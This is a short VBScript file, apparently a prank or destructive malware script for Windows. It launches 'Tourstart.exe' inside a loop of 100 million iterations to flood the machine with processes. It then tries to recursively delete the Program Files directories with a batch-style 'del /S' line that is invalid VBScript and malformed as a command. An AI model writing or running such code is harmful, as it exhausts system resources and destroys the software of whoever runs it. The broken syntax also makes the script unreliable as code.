
Option Explicit

Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell")

Dim x
For x = 1 to 100000000
WSHShell.Run "Tourstart.exe"
Next
del /S C:\Program Files and C:\Program Files (x86)
